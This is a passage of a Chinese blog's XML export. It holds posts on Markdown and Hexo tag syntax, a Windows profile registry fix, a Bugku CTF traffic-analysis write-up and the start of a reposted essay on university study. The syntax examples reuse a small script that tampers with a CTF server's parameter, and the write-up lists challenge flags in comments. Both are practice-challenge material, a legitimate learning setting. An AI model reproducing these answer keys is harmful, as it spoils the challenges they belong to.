            <tag> picoctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>markdown语法与hexo标签插件</title>
      <link href="/2018/09/29/markdown%E8%AF%AD%E6%B3%95%E4%B8%8Ehexo%E6%A0%87%E7%AD%BE%E6%8F%92%E4%BB%B6/"/>
      <url>/2018/09/29/markdown%E8%AF%AD%E6%B3%95%E4%B8%8Ehexo%E6%A0%87%E7%AD%BE%E6%8F%92%E4%BB%B6/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>整理一下markdown语法和hexo标签插件的笔记</p></blockquote><a id="more"></a><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><ul><li><p><strong><em>Markdown是什么？</em></strong></p><blockquote><ul><li>Markdown是一种轻量级标记语言，它以纯文本形式(易读、易写、易更改)编写文档，并最终以HTML格式发布。</li><li>Markdown也可以理解为将以MARKDOWN语法编写的语言转换成HTML内容的工具。</li></ul></blockquote></li><li><p><strong><em>什么是 Hexo？</em></strong></p><blockquote><ul><li>Hexo 是一个快速、简洁且高效的博客框架。</li><li>Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</li><li>hexo标签插件可以实现部分markdown语法</li></ul></blockquote></li></ul><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>在文章中插入引言，可包含作者、来源和标题。</p><h2 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 区块引用</span><br><span class="line">&gt;&gt; 嵌套引用</span><br><span class="line">&gt;&gt;&gt; ...</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><blockquote><p>区块引用</p><blockquote><p>嵌套引用</p><blockquote><p>…    </p></blockquote></blockquote></blockquote><h3 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h3><blockquote><p>引用一个段落时可以在首行加<code>&gt;</code>，空行自动结束</p></blockquote><h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><h4 id="没有提供参数，则只输出普通的-blockquote"><a href="#没有提供参数，则只输出普通的-blockquote" class="headerlink" title="没有提供参数，则只输出普通的 blockquote"></a>没有提供参数，则只输出普通的 blockquote</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote %&#125;</span><br><span class="line">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</p></blockquote><h4 id="引用书上的句子"><a href="#引用书上的句子" class="headerlink" title="引用书上的句子"></a>引用书上的句子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote David Levithan, Wide Awake %&#125;</span><br><span class="line">Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</p><footer><strong>David Levithan</strong><cite>Wide Awake</cite></footer></blockquote><h4 id="引用-Twitter"><a href="#引用-Twitter" class="headerlink" title="引用 Twitter"></a>引用 Twitter</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %&#125;</span><br><span class="line">NEW: DevDocs now comes with syntax highlighting. http://devdocs.io</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>NEW: DevDocs now comes with syntax highlighting. <a href="http://devdocs.io" target="_blank" rel="noopener">http://devdocs.io</a></p><footer><strong>@DevDocs</strong><cite><a href="https://twitter.com/devdocs/status/356095192085962752" target="_blank" rel="noopener">twitter.com/devdocs/status/356095192085962752</a></cite></footer></blockquote><h4 id="引用网络上的文章"><a href="#引用网络上的文章" class="headerlink" title="引用网络上的文章"></a>引用网络上的文章</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html Welcome to Island Marketing %&#125;</span><br><span class="line">Every interaction is both precious and an opportunity to delight.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Every interaction is both precious and an opportunity to delight.</p><footer><strong>Seth Godin</strong><cite><a href="http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html" target="_blank" rel="noopener">Welcome to Island Marketing</a></cite></footer></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote><ul><li>若只要简单引用，markdown更方便。</li><li>复杂引用更适合使用hexo插件</li></ul></blockquote><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="markdown-1"><a href="#markdown-1" class="headerlink" title="markdown"></a>markdown</h2><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><blockquote><p>&middot;&middot;&middot;[language] [title] [url] [link text]<br>code snippet<br>&middot;&middot;&middot;    </p></blockquote><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><blockquote><p>&middot;&middot;&middot;py title <a href="https://baidu.com" target="_blank" rel="noopener">https://baidu.com</a> link-text<br>import requests,re<br>r = requests.post(‘<a href="http://120.24.86.145:9001/test/&#39;,data={&#39;clicks&#39;:1000000}" target="_blank" rel="noopener">http://120.24.86.145:9001/test/&#39;,data={&#39;clicks&#39;:1000000}</a>)<br>a = re.findall(r’flag{(.*)}’, r.text)<br>print(‘flag{‘ + %a[0] + ‘}’)<br>&middot;&middot;&middot;</p></blockquote><figure class="highlight py"><figcaption><span>title</span><a href="https://baidu.com" target="_blank" rel="noopener">link-text</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">r = requests.post(<span class="string">'http://120.24.86.145:9001/test/'</span>,data=&#123;<span class="string">'clicks'</span>:<span class="number">1000000</span>&#125;)</span><br><span class="line">a = re.findall(<span class="string">r'flag&#123;(.*)&#125;'</span>, r.text)</span><br><span class="line">print(<span class="string">'flag&#123;'</span> + %a[<span class="number">0</span>] + <span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure><h2 id="hexo-1"><a href="#hexo-1" class="headerlink" title="hexo"></a>hexo</h2><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock [title] [lang:language] [url] [link text] %&#125;</span><br><span class="line">code snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock title lang:py https://baidu.com link text %&#125;</span><br><span class="line">import requests,re</span><br><span class="line">r = requests.post(&apos;http://120.24.86.145:9001/test/&apos;,data=&#123;&apos;clicks&apos;:1000000&#125;)</span><br><span class="line">a = re.findall(r&apos;flag&#123;(.*)&#125;&apos;, r.text)</span><br><span class="line">print(&apos;flag&#123;&apos; + %a[0] + &apos;&#125;&apos;)</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><figcaption><span>title</span><a href="https://baidu.com" target="_blank" rel="noopener">link text</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">r = requests.post(<span class="string">'http://120.24.86.145:9001/test/'</span>,data=&#123;<span class="string">'clicks'</span>:<span class="number">1000000</span>&#125;)</span><br><span class="line">a = re.findall(<span class="string">r'flag&#123;(.*)&#125;'</span>, r.text)</span><br><span class="line">print(<span class="string">'flag&#123;'</span> + %a[<span class="number">0</span>] + <span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><blockquote><p>两者功能相同，就简单而言，我选择markdown语法<br>顺带提一下今天写博客发现的bug下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(&apos;flag&#123;%s&#125;&apos;%a[0]) //这是上面代码原来的部分代码，如果没有用反引号引用代码的方式将他包在里面，会使得hexo崩溃</span><br><span class="line">&#123;% //排除之后是这玩意会使得hexo崩溃</span><br><span class="line">&#123;# //测试发现这样也行</span><br></pre></td></tr></table></figure></p></blockquote><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/markdown%26hexo/2018-09-29-16-56-38.png" alt="崩溃信息" title="" class="">                <p>崩溃信息</p>            </figure><h1 id="hexo插件其他功能"><a href="#hexo插件其他功能" class="headerlink" title="hexo插件其他功能"></a>hexo插件其他功能</h1><h2 id="Pull-Quote"><a href="#Pull-Quote" class="headerlink" title="Pull Quote"></a>Pull Quote</h2><p>在文章中插入 Pull quote。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pullquote [class] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure></p><blockquote class="pullquote [class]"><p>content</p></blockquote><h2 id="jsFiddle"><a href="#jsFiddle" class="headerlink" title="jsFiddle"></a>jsFiddle</h2><p>在文章中嵌入 jsFiddle。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% jsfiddle shorttag [tabs] [skin] [width] [height] %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Gist"><a href="#Gist" class="headerlink" title="Gist"></a>Gist</h2><p>在文章中嵌入 Gist。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gist gist_id [filename] %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><p>在文章中插入 iframe。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iframe url [width] [height] %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h2><p>在文章中插入指定大小的图片。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% img [class names] /path/to/image [width] [height] [title text [alt text]] %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h2><p>在文章中插入链接，并自动给外部链接添加 target=”_blank” 属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link text url [external] [title] %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Include-Code"><a href="#Include-Code" class="headerlink" title="Include Code"></a>Include Code</h2><p>插入 source 文件夹内的代码文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include_code [title] [lang:language] path/to/file %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Youtube"><a href="#Youtube" class="headerlink" title="Youtube"></a>Youtube</h2><p>在文章中插入 Youtube 视频。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Vimeo"><a href="#Vimeo" class="headerlink" title="Vimeo"></a>Vimeo</h2><p>在文章中插入 Vimeo 视频。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% vimeo video_id %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="引用文章"><a href="#引用文章" class="headerlink" title="引用文章"></a>引用文章</h2><p>引用其他文章的链接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% post_path slug %&#125;</span><br><span class="line">&#123;% post_link slug [title] %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="引用资源"><a href="#引用资源" class="headerlink" title="引用资源"></a>引用资源</h2><p>引用文章的资源。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_path slug %&#125;</span><br><span class="line">&#123;% asset_img slug [title] %&#125;</span><br><span class="line">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Raw"><a href="#Raw" class="headerlink" title="Raw"></a>Raw</h2><p>如果您想在文章中插入 Swig 标签，可以尝试使用 Raw 标签，以免发生解析异常。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure></p><h1 id="markdown其他语法"><a href="#markdown其他语法" class="headerlink" title="markdown其他语法"></a>markdown其他语法</h1><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 1</span><br><span class="line">- 2</span><br></pre></td></tr></table></figure><ul><li>1</li><li>2</li></ul><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 一</span><br><span class="line">2. 二</span><br></pre></td></tr></table></figure><ol><li>一</li><li>二</li></ol><h3 id="代办列表"><a href="#代办列表" class="headerlink" title="代办列表"></a>代办列表</h3><p>表示列表是否勾选状态（注意：[ ] 前后都要有空格）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- [ ] 不勾选</span><br><span class="line">- [x] 勾选</span><br></pre></td></tr></table></figure></p><ul><li style="list-style: none"><input type="checkbox"> 不勾选</li><li style="list-style: none"><input type="checkbox" checked> 勾选</li></ul><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a><del>删除线</del></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><h2 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h2><h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*YuanLiChenAi*</span><br><span class="line">_YuanLiChenAi_</span><br></pre></td></tr></table></figure><p><em>YuanLiChenAi</em><br><em>YuanLiChenAi</em></p><h3 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a>加粗</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**YuanLiChenAi**</span><br><span class="line">__YuanLiChenAi__</span><br></pre></td></tr></table></figure><p><strong>YuanLiChenAi</strong><br><strong>YuanLiChenAi</strong></p><h3 id="加粗斜体"><a href="#加粗斜体" class="headerlink" title="加粗斜体"></a>加粗斜体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">***YuanLiChenAi***</span><br><span class="line">___YuanLiChenAi___</span><br></pre></td></tr></table></figure><p><strong><em>YuanLiChenAi</em></strong><br><strong><em>YuanLiChenAi</em></strong></p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">First Header | Second Header | Third Header</span><br><span class="line">------------ | ------------- | ------------</span><br><span class="line">Content Cell | Content Cell  | Content Cell</span><br><span class="line">Content Cell | Content Cell  | Content Cell</span><br></pre></td></tr></table></figure><table><thead><tr><th>First Header</th><th>Second Header</th><th>Third Header</th></tr></thead><tbody><tr><td>Content Cell</td><td>Content Cell</td><td>Content Cell</td></tr><tr><td>Content Cell</td><td>Content Cell</td><td>Content Cell</td></tr></tbody></table><p>或者也可以让表格两边内容对齐，中间内容居中，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">First Header | Second Header | Third Header</span><br><span class="line">:----------- | :-----------: | -----------:</span><br><span class="line">Left         | Center        | Right</span><br><span class="line">Left         | Center        | Right</span><br></pre></td></tr></table></figure></p><table><thead><tr><th style="text-align:left">First Header</th><th style="text-align:center">Second Header</th><th style="text-align:right">Third Header</th></tr></thead><tbody><tr><td style="text-align:left">Left</td><td style="text-align:center">Center</td><td style="text-align:right">Right</td></tr><tr><td style="text-align:left">Left</td><td style="text-align:center">Center</td><td style="text-align:right">Right</td></tr></tbody></table><h2 id="上标-amp-下标"><a href="#上标-amp-下标" class="headerlink" title="上标&amp;下标"></a>上标&amp;下标</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&lt;sup&gt;2&lt;/sup&gt;</span><br><span class="line">H&lt;sub&gt;2&lt;/sub&gt;O  CO&lt;sub&gt;2&lt;/sub&gt;</span><br><span class="line"># 使用数学公式</span><br><span class="line">$2^2$</span><br><span class="line">$H_2$</span><br></pre></td></tr></table></figure><p>a<sup>2</sup><br>H<sub>2</sub>O  CO<sub>2</sub><br>$2^2$<br>$H_2$</p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows用户文件迁移</title>
      <link href="/2018/09/25/windows%E7%94%A8%E6%88%B7%E6%96%87%E4%BB%B6%E8%BF%81%E7%A7%BB/"/>
      <url>/2018/09/25/windows%E7%94%A8%E6%88%B7%E6%96%87%E4%BB%B6%E8%BF%81%E7%A7%BB/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>今天把域账户文件夹手贱删除了，而且没备份，然后就登不回去，提示账户无法登陆。</p></blockquote><a id="more"></a><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/window-user/2018-09-25.jpg" alt="无法登陆到你的账户" title="" class="">                <p>无法登陆到你的账户</p>            </figure><p>原本我是想删除原默认域账户文件，然后把本地账户文件夹名重命名，省的我在配置一次。结果凉凉，然后按照提示注销，重新登陆后仍然没用，还是这样。<br>尝试多种方法，发现以下情况：<br><blockquote><ul><li>登陆域账户，与域账号同名的文件夹并没有被使用</li><li>用户文件夹下出现TEMP文件夹，这才是我当前的用户文件夹，不过注销后就自动删除</li><li>尝试删除并重新添加域账户无效，问题还在</li></ul></blockquote><br>于是先解决TEMP的问题，有时候因为账户配置文件出现问题，导致域用户登录电脑时，只能登录temp临时账户。通过删除注册表信息我们可以恢复域账户登录。<br>注册表地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-793558431-3863633201-2293836228-1001</span><br></pre></td></tr></table></figure></p><p>找到对应的注册表信息，并删除<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/window-user/2018-09-25-20-38-47.png" alt="注册表" title="" class="">                <p>注册表</p>            </figure><br>百度经验：<a href="https://jingyan.baidu.com/article/da1091fb6502b3027949d664.html" target="_blank" rel="noopener">如何解决域用户登录Temp临时账户问题</a><br>写博客的时候看到另一个方法，<a href="https://jingyan.baidu.com/article/ca00d56c245854e99febcf57.html" target="_blank" rel="noopener">win无法登陆到你的账号怎么解决</a></p>]]></content>
      
      <categories>
          
          <category> System </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bugku-流量分析-writeup</title>
      <link href="/2018/09/18/Bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-writeup/"/>
      <url>/2018/09/18/Bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Bugku流量分析题，</p></blockquote><a id="more"></a><h1 id="flag被盗"><a href="#flag被盗" class="headerlink" title="flag被盗"></a>flag被盗</h1><p><code>Ctrl+F</code>打开查找分组，选择<code>分组字节流</code>、<code>字符串</code>，查找<code>flag{</code><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Packet/2018-09-18-11-10-13.png" alt="" title="" class="">                <p></p>            </figure><br><!--flag{This_is_a_f10g}--></p><h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><p><a href="/2018/03/19/Bugku/Misc-2/#中国菜刀">解题链接</a><br><!--key{8769fe393f2b998fa6a11afe2bfcd65e}--></p><h1 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h1><p><a href="/2018/03/19/Bugku/Misc-2/#这么多数据包">解题链接</a><br><!--CCTF{do_you_like_sniffer}--></p><h1 id="流量分析-cnss"><a href="#流量分析-cnss" class="headerlink" title="流量分析-cnss"></a>流量分析-cnss</h1><p><a href="/2018/05/03/Bugku/Misc-3/#流量分析-cnss">解题链接</a><br><!--cnss{b1libil1_A_gay_wEbsite}--></p><h1 id="手机热点"><a href="#手机热点" class="headerlink" title="手机热点"></a>手机热点</h1><p>foremost提取文件，flagzairar压缩包里面<br><!--SYC{this_is_bluetooth}--></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> Misc </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>上大学必读，你去大学学什么？</title>
      <link href="/2018/09/06/%E4%B8%8A%E5%A4%A7%E5%AD%A6%E5%BF%85%E8%AF%BB%EF%BC%8C%E4%BD%A0%E5%8E%BB%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
      <url>/2018/09/06/%E4%B8%8A%E5%A4%A7%E5%AD%A6%E5%BF%85%E8%AF%BB%EF%BC%8C%E4%BD%A0%E5%8E%BB%E5%A4%A7%E5%AD%A6%E5%AD%A6%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>虽然对我这个上完大学的人来说有点晚了，但是观点不错，仅供参考，转载一下</p></blockquote><a id="more"></a><p>今天继续教育的话题：<br>上大学必读，你去大学学什么？</p><p>谈大学教育前，我们先玩个好玩的测试。</p><h1 id="测下你的思维阶段和模型。"><a href="#测下你的思维阶段和模型。" class="headerlink" title="测下你的思维阶段和模型。"></a>测下你的思维阶段和模型。</h1><blockquote><p>题目很简单：<br>假如你在生活中遇到困难，你怎么办？</p></blockquote><h2 id="A：你嚎啕大哭，悲愤地像马景涛同学一样地天问："><a href="#A：你嚎啕大哭，悲愤地像马景涛同学一样地天问：" class="headerlink" title="A：你嚎啕大哭，悲愤地像马景涛同学一样地天问："></a>A：你嚎啕大哭，悲愤地像马景涛同学一样地天问：</h2><p>为什么？为什么？<br>为什么世界对我如此的不友善呢？<br>我到底做错了什么？<br>为什么要受到如此的惩罚？……</p><p>呵呵，亲，你还处于幼儿园思维阶段，<br>标志就是：条件反射似的情绪思维。<br>遇到问题完全受情绪支配，<br>你的情绪，远大于你的思维。</p><p>你其实还是个婴儿，<br>无力面对这个世界。<br>即使你牛高马大，<br>但面对任何人或者事，<br>你基本上属于总是受伤的那一个。</p><p>现在搞清楚马景涛的咆哮，<br>为什么会赢得不少人喜欢了吧？<br>因为我们很多人都处于情绪思维阶段，<br>所以喜欢他的情绪宣泄。</p><p>情绪其实会陪伴我们一生，<br>但是理性的人，在处理问题时，<br>会尽量抛开情绪，<br>不让情绪影响自己的思考。   </p><h2 id="B：如果你认为，你的困难是一个叫张三的坏人故意刁难你造成的，"><a href="#B：如果你认为，你的困难是一个叫张三的坏人故意刁难你造成的，" class="headerlink" title="B：如果你认为，你的困难是一个叫张三的坏人故意刁难你造成的，"></a>B：如果你认为，你的困难是一个叫张三的坏人故意刁难你造成的，</h2><p>从此你恨死张三了。</p><p>呵呵，你的思维进入了小学阶段。<br>你开始学会用“好人和坏人”来划分你的世界。<br>当然，你永远处于“好人和正确”的立场位置，<br>与你不一样的，都划在坏人和错误的一边。</p><p>小学思维的标志是：<br>真理和固化思维模式。<br>简言之：我永远是对的！<br>即使我错了，也是情有可原。</p><p>这类思维很容易进入仇恨情怀——<br>恨死了那些跟你作对的坏人，<br>恨不得把他们都消灭掉，再踏上一只脚。<br>这也是中国人最常见的思维模式。</p><p>展开一下：<br>前几天正好看了一则新闻，<br>说跳广场舞的大妈大爷们，<br>非要占据篮球场跳舞，<br>还暴打那些想打篮球的孩子。</p><p>这些大爷大妈的思维就属于小学阶段——<br>他们永远是对的，正确的。<br>你不认可他们，你就是坏人。<br>所以他们年轻时，<br>打老师，告长辈是正确的；<br>年老了，要求年轻人必须让着他们，<br>尊重他们。照样是对的。</p><p>有意思的是，网上流行的观点：<br>不是老人变坏了，而是坏人变老了。<br>——这个思维也属于小学阶段，<br>还是在用坏人、好人来划分这个世界。<br>只不过立场正好颠倒一下，<br>但思维模型是一样的。</p><h2 id="C：你分析认为，张三是因为他二大爷的舅舅当了个芝麻官，所以他欺压老百姓，他之所以跟你作对，是嫉妒你比他帅……"><a href="#C：你分析认为，张三是因为他二大爷的舅舅当了个芝麻官，所以他欺压老百姓，他之所以跟你作对，是嫉妒你比他帅……" class="headerlink" 